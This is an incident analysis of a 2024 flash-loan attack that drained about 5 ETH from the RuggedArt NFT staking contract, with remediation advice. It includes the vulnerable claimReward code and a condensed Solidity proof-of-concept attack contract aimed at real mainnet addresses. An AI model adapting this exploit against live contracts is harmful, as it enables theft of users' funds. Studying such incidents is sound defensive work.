# RuggedArt — Flash Loan-Based NFT Staking Reward Theft Analysis

| Field | Details |
|------|------|
| **Date** | 2024-02 |
| **Protocol** | RuggedArt (RUGGED) |
| **Chain** | Ethereum |
| **Loss** | ~5 ETH |
| **Attacker** | [0x9733303117](https://etherscan.io/address/0x9733303117504c146a4e22261f2685ddb79780ef) |
| **Vulnerable Contract** | [RuggedMarket 0xfe380fe1](https://etherscan.io/address/0xfe380fe1db07e531e3519b9ae3ea9f7888ce20c6) |
| **Proxy** | [0x2648f5592c](https://etherscan.io/address/0x2648f5592c09a260C601ACde44e7f8f2944944Fb) |
| **UniV3 Pool** | [0x99147452](https://etherscan.io/address/0x99147452078fa5C6642D3E5F7efD51113A9527a5) |
| **RUGGED Token** | [0xbE33F57f](https://etherscan.io/address/0xbE33F57f41a20b2f00DEc91DcC1169597f36221F) |
| **Root Cause** | `claimReward()` and `targetedPurchase()` functions rely on instantaneous token balances with no holding period validation, allowing reward theft via temporary large-scale holdings alone |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/RuggedArt_exp.sol) |

---

## 1. Vulnerability Overview

The `claimReward()` and `targetedPurchase()` functions in the RuggedArt market have no locking or validation mechanisms when called within a flash loan context. The attacker flash-loaned RUGGED tokens worth 22 ETH from Uniswap V3, claimed staking rewards, purchased specific NFTs, and repeated staking/unstaking cycles to steal ~5 ETH.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: claimReward/targetedPurchase unprotected in flash loan context
interface IRUGGEDPROXY {
    function claimReward(address to) external;
    function targetedPurchase(
        address collection,
        uint256 tokenId,
        bytes calldata routerCommands,
        bytes[] calldata routerInputs
    ) external payable;
    function stake(uint256 tokenId) external;
    function unstake(uint256 tokenId) external;
}

// claimReward() calculates rewards based on staking time
// Staking large amounts via flash loan allows weight manipulation

// ✅ Safe code: flash loan detection + staking cooldown
mapping(address => uint256) public lastStakeBlock;

function stake(uint256 tokenId) external {
    require(block.number > lastStakeBlock[msg.sender] + COOLDOWN, "cooldown");
    lastStakeBlock[msg.sender] = block.number;
    // ... staking logic
}

function claimReward(address to) external {
    require(
        block.number > lastStakeBlock[to] + MIN_STAKE_DURATION,
        "stake too recent"
    );
    // ... reward distribution
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: RuggedMarket.sol
    function claimReward() external nonReentrant returns (uint256) {  // ❌ Vulnerability
        updatePool();
        Staker storage staker = stakers[msg.sender];
        uint256 pendingReward = (staker.amountStaked * accRewardPerShare) /
            1e12 -
            staker.rewardDebt;
        if (pendingReward > 0) {
            ruggedToken.transfer(msg.sender, pendingReward);
            staker.rewardDebt =
                (staker.amountStaked * accRewardPerShare) /
                1e12;
            emit RewardClaimed(msg.sender, pendingReward);
        }
        return pendingReward;
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Uniswap V3 flash: flash loan RUGGED worth 22 ETH
  │
  ├─→ [2] Call claimReward() → receive staking rewards
  │
  ├─→ [3] targetedPurchase() — purchase specific NFT IDs
  │         └─ Purchase hardcoded token IDs sequentially
  │
  ├─→ [4] Stake tokens via fallback function
  │
  ├─→ [5] Liquidate position in uniswapV3SwapCallback()
  │
  ├─→ [6] Repay flash loan (including fee)
  │
  └─→ [7] ~5 ETH profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IRUGGEDUNIV3POOL {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
    function swap(address recipient, bool zeroForOne, int256 amountSpecified, uint160 sqrtPriceLimitX96, bytes calldata data) external returns (int256, int256);
}

interface IRUGGEDPROXY {
    function claimReward(address to) external;
    function targetedPurchase(address collection, uint256 tokenId, bytes calldata routerCommands, bytes[] calldata routerInputs) external payable;
    function stake(uint256 tokenId) external;
    function unstake(uint256 tokenId) external;
}

contract AttackContract {
    IRUGGEDUNIV3POOL constant pool   = IRUGGEDUNIV3POOL(0x99147452078fa5C6642D3E5F7efD51113A9527a5);
    IRUGGEDPROXY     constant proxy  = IRUGGEDPROXY(0x2648f5592c09a260C601ACde44e7f8f2944944Fb);
    IRUGGED          constant RUGGED = IRUGGED(0xbE33F57f41a20b2f00DEc91DcC1169597f36221F);

    function testExploit() external {
        // [1] Flash loan RUGGED
        pool.flash(address(this), rugged22ETHAmount, 0, "");
    }

    function uniswapV3FlashCallback(uint256, uint256, bytes calldata) external {
        // [2] Claim staking rewards
        proxy.claimReward(address(this));

        // [3] Purchase specific NFTs
        uint256[] memory tokenIds = getTargetTokenIds();
        for (uint i = 0; i < tokenIds.length; i++) {
            proxy.targetedPurchase{value: 0}(address(nft), tokenIds[i], routerCommands, routerInputs);
        }

        // [4] Repay flash loan
        RUGGED.transfer(address(pool), flashAmount + fee);
    }

    fallback() external payable {
        // [5] Stake tokens
        proxy.stake(receivedTokenId);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | NFT staking reward manipulation within flash loan context |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |
| **Attack Vector** | External (flash loan + claimReward + targetedPurchase) |
| **DApp Category** | NFT marketplace + staking reward system |
| **Impact** | Theft of staking reward pool and NFT assets |

## 6. Remediation Recommendations

1. **Minimum Staking Duration**: Require staking for a minimum of N blocks before claiming rewards
2. **Flash Loan Lock**: Block `claimReward()` calls when a flash loan is active
3. **Intra-block Staking Restriction**: Prevent stake + claim + unstake within the same block
4. **Delayed Reward Distribution**: Apply a claim-after-N-blocks model instead of immediate rewards

## 7. Lessons Learned

- NFT staking reward systems are vulnerable to attack patterns that stake briefly via flash loan and immediately claim rewards.
- Complex functions such as `targetedPurchase()` must be carefully reviewed to determine whether they can be called within a flash loan context.
- Even small-scale attacks (~5 ETH) expose structural flaws in reward logic that carry the potential for large-scale exploitation.